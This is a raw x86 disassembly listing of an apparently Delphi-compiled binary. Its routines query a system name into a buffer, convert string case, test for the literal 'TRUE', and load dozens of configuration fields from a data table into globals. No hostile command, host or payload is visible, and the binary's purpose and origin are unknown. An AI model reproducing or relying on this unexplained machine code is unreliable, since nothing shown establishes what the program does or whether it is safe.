  406ef6:	33 c0                	xor    %eax,%eax
  406ef8:	55                   	push   %ebp
  406ef9:	68 6d 6f 40 00       	push   $0x406f6d
  406efe:	64 ff 30             	push   %fs:(%eax)
  406f01:	64 89 20             	mov    %esp,%fs:(%eax)
  406f04:	8b c6                	mov    %esi,%eax
  406f06:	e8 45 c8 ff ff       	call   0x403750
  406f0b:	c7 45 fc 64 00 00 00 	movl   $0x64,-0x4(%ebp)
  406f12:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406f15:	e8 12 b9 ff ff       	call   0x40282c
  406f1a:	8b d8                	mov    %eax,%ebx
  406f1c:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406f1f:	50                   	push   %eax
  406f20:	53                   	push   %ebx
  406f21:	e8 e2 db ff ff       	call   0x404b08
  406f26:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  406f2c:	8b d3                	mov    %ebx,%edx
  406f2e:	e8 6d bd ff ff       	call   0x402ca0
  406f33:	8d 95 f8 fe ff ff    	lea    -0x108(%ebp),%edx
  406f39:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406f3c:	e8 5f c9 ff ff       	call   0x4038a0
  406f41:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406f44:	8b c6                	mov    %esi,%eax
  406f46:	b9 84 6f 40 00       	mov    $0x406f84,%ecx
  406f4b:	e8 c0 c9 ff ff       	call   0x403910
  406f50:	8b c3                	mov    %ebx,%eax
  406f52:	e8 05 b9 ff ff       	call   0x40285c
  406f57:	33 c0                	xor    %eax,%eax
  406f59:	5a                   	pop    %edx
  406f5a:	59                   	pop    %ecx
  406f5b:	59                   	pop    %ecx
  406f5c:	64 89 10             	mov    %edx,%fs:(%eax)
  406f5f:	68 74 6f 40 00       	push   $0x406f74
  406f64:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406f67:	e8 e4 c7 ff ff       	call   0x403750
  406f6c:	c3                   	ret
  406f6d:	e9 52 c2 ff ff       	jmp    0x4031c4
  406f72:	eb f0                	jmp    0x406f64
  406f74:	5e                   	pop    %esi
  406f75:	5b                   	pop    %ebx
  406f76:	8b e5                	mov    %ebp,%esp
  406f78:	5d                   	pop    %ebp
  406f79:	c3                   	ret
  406f7a:	00 00                	add    %al,(%eax)
  406f7c:	ff                   	(bad)
  406f7d:	ff                   	(bad)
  406f7e:	ff                   	(bad)
  406f7f:	ff 01                	incl   (%ecx)
  406f81:	00 00                	add    %al,(%eax)
  406f83:	00 32                	add    %dh,(%edx)
  406f85:	00 00                	add    %al,(%eax)
  406f87:	00 55 8b             	add    %dl,-0x75(%ebp)
  406f8a:	ec                   	in     (%dx),%al
  406f8b:	81 c4 f8 fe ff ff    	add    $0xfffffef8,%esp
  406f91:	53                   	push   %ebx
  406f92:	56                   	push   %esi
  406f93:	33 d2                	xor    %edx,%edx
  406f95:	89 55 f8             	mov    %edx,-0x8(%ebp)
  406f98:	8b f0                	mov    %eax,%esi
  406f9a:	33 c0                	xor    %eax,%eax
  406f9c:	55                   	push   %ebp
  406f9d:	68 11 70 40 00       	push   $0x407011
  406fa2:	64 ff 30             	push   %fs:(%eax)
  406fa5:	64 89 20             	mov    %esp,%fs:(%eax)
  406fa8:	8b c6                	mov    %esi,%eax
  406faa:	e8 a1 c7 ff ff       	call   0x403750
  406faf:	c7 45 fc 64 00 00 00 	movl   $0x64,-0x4(%ebp)
  406fb6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406fb9:	e8 6e b8 ff ff       	call   0x40282c
  406fbe:	8b d8                	mov    %eax,%ebx
  406fc0:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406fc3:	50                   	push   %eax
  406fc4:	53                   	push   %ebx
  406fc5:	e8 3e db ff ff       	call   0x404b08
  406fca:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  406fd0:	8b d3                	mov    %ebx,%edx
  406fd2:	e8 c9 bc ff ff       	call   0x402ca0
  406fd7:	8d 95 f8 fe ff ff    	lea    -0x108(%ebp),%edx
  406fdd:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406fe0:	e8 bb c8 ff ff       	call   0x4038a0
  406fe5:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406fe8:	8b c6                	mov    %esi,%eax
  406fea:	b9 28 70 40 00       	mov    $0x407028,%ecx
  406fef:	e8 1c c9 ff ff       	call   0x403910
  406ff4:	8b c3                	mov    %ebx,%eax
  406ff6:	e8 61 b8 ff ff       	call   0x40285c
  406ffb:	33 c0                	xor    %eax,%eax
  406ffd:	5a                   	pop    %edx
  406ffe:	59                   	pop    %ecx
  406fff:	59                   	pop    %ecx
  407000:	64 89 10             	mov    %edx,%fs:(%eax)
  407003:	68 18 70 40 00       	push   $0x407018
  407008:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40700b:	e8 40 c7 ff ff       	call   0x403750
  407010:	c3                   	ret
  407011:	e9 ae c1 ff ff       	jmp    0x4031c4
  407016:	eb f0                	jmp    0x407008
  407018:	5e                   	pop    %esi
  407019:	5b                   	pop    %ebx
  40701a:	8b e5                	mov    %ebp,%esp
  40701c:	5d                   	pop    %ebp
  40701d:	c3                   	ret
  40701e:	00 00                	add    %al,(%eax)
  407020:	ff                   	(bad)
  407021:	ff                   	(bad)
  407022:	ff                   	(bad)
  407023:	ff 01                	incl   (%ecx)
  407025:	00 00                	add    %al,(%eax)
  407027:	00 35 00 00 00 55    	add    %dh,0x55000000
  40702d:	8b ec                	mov    %esp,%ebp
  40702f:	83 c4 f8             	add    $0xfffffff8,%esp
  407032:	53                   	push   %ebx
  407033:	56                   	push   %esi
  407034:	33 d2                	xor    %edx,%edx
  407036:	89 55 f8             	mov    %edx,-0x8(%ebp)
  407039:	8b f0                	mov    %eax,%esi
  40703b:	33 c0                	xor    %eax,%eax
  40703d:	55                   	push   %ebp
  40703e:	68 a1 70 40 00       	push   $0x4070a1
  407043:	64 ff 30             	push   %fs:(%eax)
  407046:	64 89 20             	mov    %esp,%fs:(%eax)
  407049:	8b c6                	mov    %esi,%eax
  40704b:	e8 00 c7 ff ff       	call   0x403750
  407050:	c7 45 fc 64 00 00 00 	movl   $0x64,-0x4(%ebp)
  407057:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40705a:	e8 cd b7 ff ff       	call   0x40282c
  40705f:	8b d8                	mov    %eax,%ebx
  407061:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407064:	50                   	push   %eax
  407065:	53                   	push   %ebx
  407066:	e8 9d da ff ff       	call   0x404b08
  40706b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40706e:	8b d3                	mov    %ebx,%edx
  407070:	e8 fb c7 ff ff       	call   0x403870
  407075:	8b 55 f8             	mov    -0x8(%ebp),%edx
  407078:	8b c6                	mov    %esi,%eax
  40707a:	b9 b8 70 40 00       	mov    $0x4070b8,%ecx
  40707f:	e8 8c c8 ff ff       	call   0x403910
  407084:	8b c3                	mov    %ebx,%eax
  407086:	e8 d1 b7 ff ff       	call   0x40285c
  40708b:	33 c0                	xor    %eax,%eax
  40708d:	5a                   	pop    %edx
  40708e:	59                   	pop    %ecx
  40708f:	59                   	pop    %ecx
  407090:	64 89 10             	mov    %edx,%fs:(%eax)
  407093:	68 a8 70 40 00       	push   $0x4070a8
  407098:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40709b:	e8 b0 c6 ff ff       	call   0x403750
  4070a0:	c3                   	ret
  4070a1:	e9 1e c1 ff ff       	jmp    0x4031c4
  4070a6:	eb f0                	jmp    0x407098
  4070a8:	5e                   	pop    %esi
  4070a9:	5b                   	pop    %ebx
  4070aa:	59                   	pop    %ecx
  4070ab:	59                   	pop    %ecx
  4070ac:	5d                   	pop    %ebp
  4070ad:	c3                   	ret
  4070ae:	00 00                	add    %al,(%eax)
  4070b0:	ff                   	(bad)
  4070b1:	ff                   	(bad)
  4070b2:	ff                   	(bad)
  4070b3:	ff 02                	incl   (%edx)
  4070b5:	00 00                	add    %al,(%eax)
  4070b7:	00 31                	add    %dh,(%ecx)
  4070b9:	35 00 00 53 56       	xor    $0x56530000,%eax
  4070be:	57                   	push   %edi
  4070bf:	51                   	push   %ecx
  4070c0:	89 14 24             	mov    %edx,(%esp)
  4070c3:	8b f0                	mov    %eax,%esi
  4070c5:	8b c6                	mov    %esi,%eax
  4070c7:	e8 f8 c7 ff ff       	call   0x4038c4
  4070cc:	8b f8                	mov    %eax,%edi
  4070ce:	8b df                	mov    %edi,%ebx
  4070d0:	83 fb 01             	cmp    $0x1,%ebx
  4070d3:	7c 25                	jl     0x4070fa
  4070d5:	8a 44 1e ff          	mov    -0x1(%esi,%ebx,1),%al
  4070d9:	3c 5c                	cmp    $0x5c,%al
  4070db:	74 04                	je     0x4070e1
  4070dd:	3c 2f                	cmp    $0x2f,%al
  4070df:	75 14                	jne    0x4070f5
  4070e1:	8b 04 24             	mov    (%esp),%eax
  4070e4:	50                   	push   %eax
  4070e5:	8b cf                	mov    %edi,%ecx
  4070e7:	2b cb                	sub    %ebx,%ecx
  4070e9:	8d 53 01             	lea    0x1(%ebx),%edx
  4070ec:	8b c6                	mov    %esi,%eax
  4070ee:	e8 31 ca ff ff       	call   0x403b24
  4070f3:	eb 05                	jmp    0x4070fa
  4070f5:	4b                   	dec    %ebx
  4070f6:	85 db                	test   %ebx,%ebx
  4070f8:	75 db                	jne    0x4070d5
  4070fa:	5a                   	pop    %edx
  4070fb:	5f                   	pop    %edi
  4070fc:	5e                   	pop    %esi
  4070fd:	5b                   	pop    %ebx
  4070fe:	c3                   	ret
  4070ff:	90                   	nop
  407100:	55                   	push   %ebp
  407101:	8b ec                	mov    %esp,%ebp
  407103:	83 c4 ec             	add    $0xffffffec,%esp
  407106:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407109:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40710c:	e8 a3 c9 ff ff       	call   0x403ab4
  407111:	33 c0                	xor    %eax,%eax
  407113:	55                   	push   %ebp
  407114:	68 46 71 40 00       	push   $0x407146
  407119:	64 ff 30             	push   %fs:(%eax)
  40711c:	64 89 20             	mov    %esp,%fs:(%eax)
  40711f:	8d 55 ec             	lea    -0x14(%ebp),%edx
  407122:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407125:	e8 0e d1 ff ff       	call   0x404238
  40712a:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40712d:	89 55 f4             	mov    %edx,-0xc(%ebp)
  407130:	33 c0                	xor    %eax,%eax
  407132:	5a                   	pop    %edx
  407133:	59                   	pop    %ecx
  407134:	59                   	pop    %ecx
  407135:	64 89 10             	mov    %edx,%fs:(%eax)
  407138:	68 4d 71 40 00       	push   $0x40714d
  40713d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407140:	e8 0b c6 ff ff       	call   0x403750
  407145:	c3                   	ret
  407146:	e9 79 c0 ff ff       	jmp    0x4031c4
  40714b:	eb f0                	jmp    0x40713d
  40714d:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407150:	8b 55 f4             	mov    -0xc(%ebp),%edx
  407153:	8b e5                	mov    %ebp,%esp
  407155:	5d                   	pop    %ebp
  407156:	c3                   	ret
  407157:	90                   	nop
  407158:	55                   	push   %ebp
  407159:	8b ec                	mov    %esp,%ebp
  40715b:	51                   	push   %ecx
  40715c:	53                   	push   %ebx
  40715d:	56                   	push   %esi
  40715e:	57                   	push   %edi
  40715f:	8b fa                	mov    %edx,%edi
  407161:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407164:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407167:	e8 48 c9 ff ff       	call   0x403ab4
  40716c:	33 c0                	xor    %eax,%eax
  40716e:	55                   	push   %ebp
  40716f:	68 cd 71 40 00       	push   $0x4071cd
  407174:	64 ff 30             	push   %fs:(%eax)
  407177:	64 89 20             	mov    %esp,%fs:(%eax)
  40717a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40717d:	e8 42 c7 ff ff       	call   0x4038c4
  407182:	8b f0                	mov    %eax,%esi
  407184:	85 f6                	test   %esi,%esi
  407186:	7e 25                	jle    0x4071ad
  407188:	bb 01 00 00 00       	mov    $0x1,%ebx
  40718d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407190:	0f b6 44 18 ff       	movzbl -0x1(%eax,%ebx,1),%eax
  407195:	50                   	push   %eax
  407196:	e8 fd da ff ff       	call   0x404c98
  40719b:	50                   	push   %eax
  40719c:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40719f:	e8 78 c9 ff ff       	call   0x403b1c
  4071a4:	5a                   	pop    %edx
  4071a5:	88 54 18 ff          	mov    %dl,-0x1(%eax,%ebx,1)
  4071a9:	43                   	inc    %ebx
  4071aa:	4e                   	dec    %esi
  4071ab:	75 e0                	jne    0x40718d
  4071ad:	8b c7                	mov    %edi,%eax
  4071af:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4071b2:	e8 ed c5 ff ff       	call   0x4037a4
  4071b7:	33 c0                	xor    %eax,%eax
  4071b9:	5a                   	pop    %edx
  4071ba:	59                   	pop    %ecx
  4071bb:	59                   	pop    %ecx
  4071bc:	64 89 10             	mov    %edx,%fs:(%eax)
  4071bf:	68 d4 71 40 00       	push   $0x4071d4
  4071c4:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4071c7:	e8 84 c5 ff ff       	call   0x403750
  4071cc:	c3                   	ret
  4071cd:	e9 f2 bf ff ff       	jmp    0x4031c4
  4071d2:	eb f0                	jmp    0x4071c4
  4071d4:	5f                   	pop    %edi
  4071d5:	5e                   	pop    %esi
  4071d6:	5b                   	pop    %ebx
  4071d7:	59                   	pop    %ecx
  4071d8:	5d                   	pop    %ebp
  4071d9:	c3                   	ret
  4071da:	8b c0                	mov    %eax,%eax
  4071dc:	55                   	push   %ebp
  4071dd:	8b ec                	mov    %esp,%ebp
  4071df:	51                   	push   %ecx
  4071e0:	53                   	push   %ebx
  4071e1:	56                   	push   %esi
  4071e2:	57                   	push   %edi
  4071e3:	8b fa                	mov    %edx,%edi
  4071e5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4071e8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4071eb:	e8 c4 c8 ff ff       	call   0x403ab4
  4071f0:	33 c0                	xor    %eax,%eax
  4071f2:	55                   	push   %ebp
  4071f3:	68 51 72 40 00       	push   $0x407251
  4071f8:	64 ff 30             	push   %fs:(%eax)
  4071fb:	64 89 20             	mov    %esp,%fs:(%eax)
  4071fe:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407201:	e8 be c6 ff ff       	call   0x4038c4
  407206:	8b f0                	mov    %eax,%esi
  407208:	85 f6                	test   %esi,%esi
  40720a:	7e 25                	jle    0x407231
  40720c:	bb 01 00 00 00       	mov    $0x1,%ebx
  407211:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407214:	0f b6 44 18 ff       	movzbl -0x1(%eax,%ebx,1),%eax
  407219:	50                   	push   %eax
  40721a:	e8 71 da ff ff       	call   0x404c90
  40721f:	50                   	push   %eax
  407220:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407223:	e8 f4 c8 ff ff       	call   0x403b1c
  407228:	5a                   	pop    %edx
  407229:	88 54 18 ff          	mov    %dl,-0x1(%eax,%ebx,1)
  40722d:	43                   	inc    %ebx
  40722e:	4e                   	dec    %esi
  40722f:	75 e0                	jne    0x407211
  407231:	8b c7                	mov    %edi,%eax
  407233:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407236:	e8 69 c5 ff ff       	call   0x4037a4
  40723b:	33 c0                	xor    %eax,%eax
  40723d:	5a                   	pop    %edx
  40723e:	59                   	pop    %ecx
  40723f:	59                   	pop    %ecx
  407240:	64 89 10             	mov    %edx,%fs:(%eax)
  407243:	68 58 72 40 00       	push   $0x407258
  407248:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40724b:	e8 00 c5 ff ff       	call   0x403750
  407250:	c3                   	ret
  407251:	e9 6e bf ff ff       	jmp    0x4031c4
  407256:	eb f0                	jmp    0x407248
  407258:	5f                   	pop    %edi
  407259:	5e                   	pop    %esi
  40725a:	5b                   	pop    %ebx
  40725b:	59                   	pop    %ecx
  40725c:	5d                   	pop    %ebp
  40725d:	c3                   	ret
  40725e:	8b c0                	mov    %eax,%eax
  407260:	55                   	push   %ebp
  407261:	8b ec                	mov    %esp,%ebp
  407263:	33 c0                	xor    %eax,%eax
  407265:	55                   	push   %ebp
  407266:	68 85 72 40 00       	push   $0x407285
  40726b:	64 ff 30             	push   %fs:(%eax)
  40726e:	64 89 20             	mov    %esp,%fs:(%eax)
  407271:	ff 05 64 b8 40 00    	incl   0x40b864
  407277:	33 c0                	xor    %eax,%eax
  407279:	5a                   	pop    %edx
  40727a:	59                   	pop    %ecx
  40727b:	59                   	pop    %ecx
  40727c:	64 89 10             	mov    %edx,%fs:(%eax)
  40727f:	68 8c 72 40 00       	push   $0x40728c
  407284:	c3                   	ret
  407285:	e9 3a bf ff ff       	jmp    0x4031c4
  40728a:	eb f8                	jmp    0x407284
  40728c:	5d                   	pop    %ebp
  40728d:	c3                   	ret
  40728e:	8b c0                	mov    %eax,%eax
  407290:	83 2d 64 b8 40 00 01 	subl   $0x1,0x40b864
  407297:	c3                   	ret
  407298:	55                   	push   %ebp
  407299:	8b ec                	mov    %esp,%ebp
  40729b:	51                   	push   %ecx
  40729c:	53                   	push   %ebx
  40729d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4072a0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4072a3:	e8 0c c8 ff ff       	call   0x403ab4
  4072a8:	33 c0                	xor    %eax,%eax
  4072aa:	55                   	push   %ebp
  4072ab:	68 df 72 40 00       	push   $0x4072df
  4072b0:	64 ff 30             	push   %fs:(%eax)
  4072b3:	64 89 20             	mov    %esp,%fs:(%eax)
  4072b6:	33 db                	xor    %ebx,%ebx
  4072b8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4072bb:	ba f4 72 40 00       	mov    $0x4072f4,%edx
  4072c0:	e8 4b c7 ff ff       	call   0x403a10
  4072c5:	75 02                	jne    0x4072c9
  4072c7:	b3 01                	mov    $0x1,%bl
  4072c9:	33 c0                	xor    %eax,%eax
  4072cb:	5a                   	pop    %edx
  4072cc:	59                   	pop    %ecx
  4072cd:	59                   	pop    %ecx
  4072ce:	64 89 10             	mov    %edx,%fs:(%eax)
  4072d1:	68 e6 72 40 00       	push   $0x4072e6
  4072d6:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4072d9:	e8 72 c4 ff ff       	call   0x403750
  4072de:	c3                   	ret
  4072df:	e9 e0 be ff ff       	jmp    0x4031c4
  4072e4:	eb f0                	jmp    0x4072d6
  4072e6:	8b c3                	mov    %ebx,%eax
  4072e8:	5b                   	pop    %ebx
  4072e9:	59                   	pop    %ecx
  4072ea:	5d                   	pop    %ebp
  4072eb:	c3                   	ret
  4072ec:	ff                   	(bad)
  4072ed:	ff                   	(bad)
  4072ee:	ff                   	(bad)
  4072ef:	ff 04 00             	incl   (%eax,%eax,1)
  4072f2:	00 00                	add    %al,(%eax)
  4072f4:	54                   	push   %esp
  4072f5:	52                   	push   %edx
  4072f6:	55                   	push   %ebp
  4072f7:	45                   	inc    %ebp
  4072f8:	00 00                	add    %al,(%eax)
  4072fa:	00 00                	add    %al,(%eax)
  4072fc:	55                   	push   %ebp
  4072fd:	8b ec                	mov    %esp,%ebp
  4072ff:	33 c0                	xor    %eax,%eax
  407301:	55                   	push   %ebp
  407302:	68 21 73 40 00       	push   $0x407321
  407307:	64 ff 30             	push   %fs:(%eax)
  40730a:	64 89 20             	mov    %esp,%fs:(%eax)
  40730d:	ff 05 6c b8 40 00    	incl   0x40b86c
  407313:	33 c0                	xor    %eax,%eax
  407315:	5a                   	pop    %edx
  407316:	59                   	pop    %ecx
  407317:	59                   	pop    %ecx
  407318:	64 89 10             	mov    %edx,%fs:(%eax)
  40731b:	68 28 73 40 00       	push   $0x407328
  407320:	c3                   	ret
  407321:	e9 9e be ff ff       	jmp    0x4031c4
  407326:	eb f8                	jmp    0x407320
  407328:	5d                   	pop    %ebp
  407329:	c3                   	ret
  40732a:	8b c0                	mov    %eax,%eax
  40732c:	83 2d 6c b8 40 00 01 	subl   $0x1,0x40b86c
  407333:	c3                   	ret
  407334:	53                   	push   %ebx
  407335:	56                   	push   %esi
  407336:	57                   	push   %edi
  407337:	55                   	push   %ebp
  407338:	8b 1d c8 a0 40 00    	mov    0x40a0c8,%ebx
  40733e:	bd 14 00 00 00       	mov    $0x14,%ebp
  407343:	8b f3                	mov    %ebx,%esi
  407345:	bf 70 b8 40 00       	mov    $0x40b870,%edi
  40734a:	8b c7                	mov    %edi,%eax
  40734c:	8b 16                	mov    (%esi),%edx
  40734e:	e8 51 c4 ff ff       	call   0x4037a4
  407353:	83 c7 04             	add    $0x4,%edi
  407356:	83 c6 04             	add    $0x4,%esi
  407359:	4d                   	dec    %ebp
  40735a:	75 ee                	jne    0x40734a
  40735c:	b8 c0 b8 40 00       	mov    $0x40b8c0,%eax
  407361:	8b 53 50             	mov    0x50(%ebx),%edx
  407364:	e8 3b c4 ff ff       	call   0x4037a4
  407369:	b8 c8 b8 40 00       	mov    $0x40b8c8,%eax
  40736e:	8b 53 54             	mov    0x54(%ebx),%edx
  407371:	e8 2e c4 ff ff       	call   0x4037a4
  407376:	8b 43 58             	mov    0x58(%ebx),%eax
  407379:	e8 1a ff ff ff       	call   0x407298
  40737e:	a2 cc b8 40 00       	mov    %al,0x40b8cc
  407383:	8b 43 5c             	mov    0x5c(%ebx),%eax
  407386:	e8 75 fd ff ff       	call   0x407100
  40738b:	a3 d0 b8 40 00       	mov    %eax,0x40b8d0
  407390:	b8 d4 b8 40 00       	mov    $0x40b8d4,%eax
  407395:	8b 53 60             	mov    0x60(%ebx),%edx
  407398:	e8 07 c4 ff ff       	call   0x4037a4
  40739d:	b8 d8 b8 40 00       	mov    $0x40b8d8,%eax
  4073a2:	8b 53 64             	mov    0x64(%ebx),%edx
  4073a5:	e8 fa c3 ff ff       	call   0x4037a4
  4073aa:	b8 dc b8 40 00       	mov    $0x40b8dc,%eax
  4073af:	8b 53 68             	mov    0x68(%ebx),%edx
  4073b2:	e8 ed c3 ff ff       	call   0x4037a4
  4073b7:	b8 e0 b8 40 00       	mov    $0x40b8e0,%eax
  4073bc:	8b 53 6c             	mov    0x6c(%ebx),%edx
  4073bf:	e8 e0 c3 ff ff       	call   0x4037a4
  4073c4:	b8 e4 b8 40 00       	mov    $0x40b8e4,%eax
  4073c9:	8b 53 70             	mov    0x70(%ebx),%edx
  4073cc:	e8 d3 c3 ff ff       	call   0x4037a4
  4073d1:	b8 e8 b8 40 00       	mov    $0x40b8e8,%eax
  4073d6:	8b 53 74             	mov    0x74(%ebx),%edx
  4073d9:	e8 c6 c3 ff ff       	call   0x4037a4
  4073de:	8b 43 78             	mov    0x78(%ebx),%eax
  4073e1:	e8 b2 fe ff ff       	call   0x407298
  4073e6:	a2 f0 b8 40 00       	mov    %al,0x40b8f0
  4073eb:	8b 43 7c             	mov    0x7c(%ebx),%eax
  4073ee:	e8 0d fd ff ff       	call   0x407100
  4073f3:	a3 f4 b8 40 00       	mov    %eax,0x40b8f4
  4073f8:	8b 83 80 00 00 00    	mov    0x80(%ebx),%eax
  4073fe:	e8 fd fc ff ff       	call   0x407100
  407403:	a3 f8 b8 40 00       	mov    %eax,0x40b8f8
  407408:	b8 fc b8 40 00       	mov    $0x40b8fc,%eax
  40740d:	8b 93 84 00 00 00    	mov    0x84(%ebx),%edx
  407413:	e8 8c c3 ff ff       	call   0x4037a4
  407418:	b8 00 b9 40 00       	mov    $0x40b900,%eax
  40741d:	8b 93 88 00 00 00    	mov    0x88(%ebx),%edx
  407423:	e8 7c c3 ff ff       	call   0x4037a4
  407428:	8b 83 8c 00 00 00    	mov    0x8c(%ebx),%eax
  40742e:	e8 65 fe ff ff       	call   0x407298
  407433:	a2 04 b9 40 00       	mov    %al,0x40b904
  407438:	8b 83 90 00 00 00    	mov    0x90(%ebx),%eax
  40743e:	e8 55 fe ff ff       	call   0x407298
  407443:	a2 05 b9 40 00       	mov    %al,0x40b905
  407448:	8b 83 94 00 00 00    	mov    0x94(%ebx),%eax
  40744e:	e8 45 fe ff ff       	call   0x407298
  407453:	a2 06 b9 40 00       	mov    %al,0x40b906
  407458:	b8 08 b9 40 00       	mov    $0x40b908,%eax
  40745d:	8b 93 98 00 00 00    	mov    0x98(%ebx),%edx
  407463:	e8 3c c3 ff ff       	call   0x4037a4
  407468:	b8 0c b9 40 00       	mov    $0x40b90c,%eax
  40746d:	8b 93 9c 00 00 00    	mov    0x9c(%ebx),%edx
  407473:	e8 2c c3 ff ff       	call   0x4037a4
  407478:	b8 10 b9 40 00       	mov    $0x40b910,%eax
  40747d:	8b 93 a4 00 00 00    	mov    0xa4(%ebx),%edx
  407483:	e8 1c c3 ff ff       	call   0x4037a4
  407488:	b8 14 b9 40 00       	mov    $0x40b914,%eax
  40748d:	8b 93 a8 00 00 00    	mov    0xa8(%ebx),%edx
  407493:	e8 0c c3 ff ff       	call   0x4037a4
  407498:	8b 83 ac 00 00 00    	mov    0xac(%ebx),%eax
  40749e:	e8 5d fc ff ff       	call   0x407100
  4074a3:	a3 18 b9 40 00       	mov    %eax,0x40b918
  4074a8:	8b 83 b0 00 00 00    	mov    0xb0(%ebx),%eax
  4074ae:	e8 4d fc ff ff       	call   0x407100
  4074b3:	a3 1c b9 40 00       	mov    %eax,0x40b91c
  4074b8:	8b 83 b4 00 00 00    	mov    0xb4(%ebx),%eax
  4074be:	e8 d5 fd ff ff       	call   0x407298
  4074c3:	a2 20 b9 40 00       	mov    %al,0x40b920
  4074c8:	8b 83 b8 00 00 00    	mov    0xb8(%ebx),%eax
  4074ce:	e8 c5 fd ff ff       	call   0x407298
  4074d3:	a2 21 b9 40 00       	mov    %al,0x40b921
  4074d8:	8b 83 bc 00 00 00    	mov    0xbc(%ebx),%eax
  4074de:	e8 b5 fd ff ff       	call   0x407298
  4074e3:	a2 22 b9 40 00       	mov    %al,0x40b922
  4074e8:	8b 83 c0 00 00 00    	mov    0xc0(%ebx),%eax
  4074ee:	e8 a5 fd ff ff       	call   0x407298
  4074f3:	a2 23 b9 40 00       	mov    %al,0x40b923
  4074f8:	8b 83 c4 00 00 00    	mov    0xc4(%ebx),%eax
  4074fe:	e8 95 fd ff ff       	call   0x407298
  407503:	a2 24 b9 40 00       	mov    %al,0x40b924
  407508:	8b 83 c8 00 00 00    	mov    0xc8(%ebx),%eax
  40750e:	e8 85 fd ff ff       	call   0x407298
  407513:	a2 25 b9 40 00       	mov    %al,0x40b925
  407518:	8b 83 cc 00 00 00    	mov    0xcc(%ebx),%eax
  40751e:	e8 75 fd ff ff       	call   0x407298
  407523:	a2 26 b9 40 00       	mov    %al,0x40b926
  407528:	8b 83 d0 00 00 00    	mov    0xd0(%ebx),%eax
  40752e:	e8 65 fd ff ff       	call   0x407298
  407533:	a2 27 b9 40 00       	mov    %al,0x40b927
  407538:	8b 83 d4 00 00 00    	mov    0xd4(%ebx),%eax
  40753e:	e8 55 fd ff ff       	call   0x407298
  407543:	a2 28 b9 40 00       	mov    %al,0x40b928
  407548:	8b 83 d8 00 00 00    	mov    0xd8(%ebx),%eax
  40754e:	e8 45 fd ff ff       	call   0x407298
  407553:	a2 29 b9 40 00       	mov    %al,0x40b929
  407558:	8b 83 dc 00 00 00    	mov    0xdc(%ebx),%eax
  40755e:	e8 35 fd ff ff       	call   0x407298
  407563:	a2 2a b9 40 00       	mov    %al,0x40b92a
  407568:	8b 83 e0 00 00 00    	mov    0xe0(%ebx),%eax
  40756e:	e8 25 fd ff ff       	call   0x407298
  407573:	a2 2b b9 40 00       	mov    %al,0x40b92b
  407578:	8b 83 e4 00 00 00    	mov    0xe4(%ebx),%eax
  40757e:	e8 7d fb ff ff       	call   0x407100
  407583:	a3 2c b9 40 00       	mov    %eax,0x40b92c
  407588:	b8 30 b9 40 00       	mov    $0x40b930,%eax
  40758d:	8b 93 e8 00 00 00    	mov    0xe8(%ebx),%edx
  407593:	e8 0c c2 ff ff       	call   0x4037a4
  407598:	8b 83 ec 00 00 00    	mov    0xec(%ebx),%eax
  40759e:	e8 f5 fc ff ff       	call   0x407298
  4075a3:	a2 34 b9 40 00       	mov    %al,0x40b934
  4075a8:	8b 83 f0 00 00 00    	mov    0xf0(%ebx),%eax
  4075ae:	e8 e5 fc ff ff       	call   0x407298
  4075b3:	a2 35 b9 40 00       	mov    %al,0x40b935
  4075b8:	8b 83 f4 00 00 00    	mov    0xf4(%ebx),%eax
  4075be:	e8 d5 fc ff ff       	call   0x407298
  4075c3:	a2 36 b9 40 00       	mov    %al,0x40b936
  4075c8:	b8 38 b9 40 00       	mov    $0x40b938,%eax
  4075cd:	8b 93 f8 00 00 00    	mov    0xf8(%ebx),%edx
  4075d3:	e8 cc c1 ff ff       	call   0x4037a4
  4075d8:	8b 83 fc 00 00 00    	mov    0xfc(%ebx),%eax
  4075de:	e8 b5 fc ff ff       	call   0x407298
  4075e3:	a2 3c b9 40 00       	mov    %al,0x40b93c
  4075e8:	8b 83 2c 01 00 00    	mov    0x12c(%ebx),%eax
  4075ee:	e8 a5 fc ff ff       	call   0x407298
  4075f3:	a2 3d b9 40 00       	mov    %al,0x40b93d
  4075f8:	b8 40 b9 40 00       	mov    $0x40b940,%eax
  4075fd:	8b 93 00 01 00 00    	mov    0x100(%ebx),%edx
  407603:	e8 9c c1 ff ff       	call   0x4037a4
  407608:	b8 44 b9 40 00       	mov    $0x40b944,%eax
  40760d:	8b 93 04 01 00 00    	mov    0x104(%ebx),%edx
